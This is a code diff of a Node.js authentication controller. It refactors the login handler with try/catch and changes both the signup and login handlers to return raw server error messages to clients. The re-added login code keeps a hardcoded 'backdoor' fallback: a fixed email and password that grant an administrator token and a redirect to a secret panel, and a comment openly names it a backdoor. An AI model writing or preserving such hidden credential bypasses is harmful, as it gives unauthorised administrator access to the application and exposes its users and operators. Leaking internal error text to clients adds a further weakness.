@@ -59,7 +59,7 @@ const registerUser = async (req, res) => {
     }
   } catch (error) {
     console.error(`[Signup Error]: ${error.message}`);
-    res.status(500).json({ success: false, message: 'حدث خطأ داخلي في الخادم.', error: error.message });
+    res.status(500).json({ success: false, message: 'خطأ الخادم: ' + error.message });
   }
 };
 
@@ -103,39 +103,44 @@ const verifyOtp = async (req, res) => {
 // @route   POST /api/auth/login
 // @access  Public
 const loginUser = async (req, res) => {
-  const { email, password } = req.body;
+  try {
+    const { email, password } = req.body;
 
-  const user = await prisma.user.findUnique({ where: { email } });
+    const user = await prisma.user.findUnique({ where: { email } });
 
-  // Uncomment if you want to enforce email verification
-  // if (user && !user.isVerified) {
-  //   return res.status(401).json({ success: false, message: 'Please verify your email first (OTP)' });
-  // }
+    // Uncomment if you want to enforce email verification
+    // if (user && !user.isVerified) {
+    //   return res.status(401).json({ success: false, message: 'Please verify your email first (OTP)' });
+    // }
 
-  if (user && (await bcrypt.compare(password, user.password))) {
-    res.json({
-      success: true,
-      message: user.role === 'ADMIN' ? 'Welcome to Secret Admin Panel' : 'Login successful',
-      token: generateToken(user.id, user.role),
-      user: {
-        id: user.id,
-        name: user.name,
-        email: user.email,
-        role: user.role,
-      },
-    });
-  } else {
-    // Fallback for hardcoded backdoor just in case to keep backward compatibility 
-    if (email === 'zomatube2012@gmail.com' && password === '162012') {
-      return res.json({ 
-        success: true, 
-        message: 'Welcome to the Secret Panel!',
-        token: generateToken(9999, 'ADMIN'),
-        redirect: '/my-secret-panel-2024'
+    if (user && (await bcrypt.compare(password, user.password))) {
+      res.json({
+        success: true,
+        message: user.role === 'ADMIN' ? 'Welcome to Secret Admin Panel' : 'Login successful',
+        token: generateToken(user.id, user.role),
+        user: {
+          id: user.id,
+          name: user.name,
+          email: user.email,
+          role: user.role,
+        },
       });
-    }
+    } else {
+      // Fallback for hardcoded backdoor just in case to keep backward compatibility 
+      if (email === 'zomatube2012@gmail.com' && password === '162012') {
+        return res.json({ 
+          success: true, 
+          message: 'Welcome to the Secret Panel!',
+          token: generateToken(9999, 'ADMIN'),
+          redirect: '/my-secret-panel-2024'
+        });
+      }
 
-    res.status(401).json({ success: false, message: 'Invalid email or password' });
+      res.status(401).json({ success: false, message: 'Invalid email or password' });
+    }
+  } catch (error) {
+    console.error(`[Login Error]: ${error.message}`);
+    res.status(500).json({ success: false, message: 'خطأ الخادم: ' + error.message });
   }
 };
 
